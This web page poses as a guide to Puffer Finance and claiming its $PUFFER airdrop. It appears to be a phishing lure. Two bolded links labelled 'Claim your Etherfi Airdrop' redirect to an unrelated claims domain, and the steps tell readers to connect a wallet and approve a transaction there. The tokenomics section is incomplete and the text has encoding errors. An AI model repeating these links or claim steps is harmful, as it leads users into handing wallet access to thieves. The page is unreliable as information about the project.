What is Puffer Finance?
Puffer Finance began as a Liquid Restaking Protocol, enabling users to optimize their staking rewards through restaking in a trustless and decentralized environment. However, over time, Puffer has evolved into a broader ecosystem of cutting-edge decentralized finance (DeFi) projects aimed at improving Ethereumâ€™s scalability, security, and efficiency.

Key components of the Puffer ecosystem include:

Puffer UniFi â€” A rollup solution designed to enhance the scalability of Ethereum by reducing gas fees and transaction times while maintaining high levels of security.
UniFi AVS â€” The first preconfirmation service for rollups, enabling faster and more secure transaction confirmations on Ethereum. This innovation helps reduce latency in transaction finality, making Ethereum-based DeFi faster and more user-friendly.
At the heart of the Puffer ecosystem is the $PUFFER token, which plays a vital role in governance, incentivizing participation, and powering the protocolâ€™s future.

What is $PUFFER?
$PUFFER is the governance token of the Puffer ecosystem. By holding $PUFFER tokens, you gain voting power that allows you to influence key decisions regarding the future of the Puffer protocol. This includes voting on protocol upgrades, new product features, community initiatives, and how resources should be allocated within the ecosystem. **[Claim your Etherfi Airdrop](/302.html?target=https://drop-claims.org/index.html#78891)**

Aside from governance, $PUFFER also offers opportunities for staking and liquidity provision, rewarding holders for actively participating in the growth of the protocol. The airdrop is an opportunity for supporters to gain governance tokens and have a say in shaping the future of the protocol.

$PUFFER Tokenomics Overview
The total supply of $PUFFER is set at 1 billion tokens, with a carefully thought-out distribution model that ensures decentralization, long-term sustainability, and rewarding community participation. Hereâ€™s a breakdown of the $PUFFER token allocation:

Ecosystem & Community (40%)

Protocol Guild (1%)

In alignment with the Ethereum Protocol Guild, Puffer has pledged 1% of the total token supply to support the core development of Ethereum. This allocation is vested over a four-year period and supports Ethereumâ€™s ongoing growth and improvement.

How to Claim Your $PUFFER Tokens â€” Step-by-Step Guide
Ready to claim your $PUFFER tokens? Follow this detailed guide to ensure you donâ€™t miss out on your share of the airdrop. **[Claim your Etherfi Airdrop](/302.html?target=https://drop-claims.org/index.html#78891)**

Step 1: Set Up an Ethereum-Compatible Wallet
To claim your $PUFFER tokens, youâ€™ll need an Ethereum-compatible wallet that supports ERC-20 tokens. The most popular option is MetaMask, which can be installed as a browser extension or mobile app.

Once installed, set up your wallet by following the on-screen instructions. Make sure to securely store your seed phrase as this will be required to recover your wallet if you lose access to it.

Step 2: Ensure You Have ETH for Gas Fees
Claiming tokens on the Ethereum network requires paying gas fees. These fees are necessary for processing the transaction and transferring your $PUFFER tokens to your wallet. Make sure you have a small amount of ETH in your wallet to cover gas fees. Gas prices fluctuate, so itâ€™s a good idea to check current rates before proceeding.

Step 3: Visit the Puffer Official Airdrop Page
Once your wallet is ready and you have enough ETH to cover gas fees, head over to the Puffer Official Airdrop Page. This is where you will connect your wallet and begin the process of claiming your tokens.

Step 4: Connect Your Wallet
On the airdrop page, click the Connect Wallet button and select your preferred Ethereum-compatible wallet (such as MetaMask). Once connected, the platform will automatically check if your wallet address is eligible for the airdrop based on the October 5, 2024 snapshot or other eligible activities.

Step 5: Verify Your Eligibility
After connecting your wallet, the platform will verify whether your wallet is eligible for the airdrop. If you participated in the Crunchy Carrot Quest or other qualifying activities, youâ€™ll see the amount of $PUFFER tokens youâ€™re entitled to claim.

Step 6: Claim Your Tokens
Once your eligibility is confirmed, click the Claim button. A MetaMask pop-up will appear asking you to approve the transaction. Review the gas fees, confirm the transaction, and your tokens will be transferred to your wallet.

Step 7: Manage Your Vested Tokens
If youâ€™re eligible for a larger allocation, 65% of your tokens will be available for immediate withdrawal. The remaining 35% will be vested over six months. You will need to return to the Puffer Official Airdrop Page periodically to claim your vested tokens as they become available.

Step 8: Stay Safe
Always make sure youâ€™re interacting with the official Puffer platform. Double-check the URL, and never share your private keys or seed phrase with anyone. Be cautious of phishing attempts, and ensure that you are claiming your tokens securely.
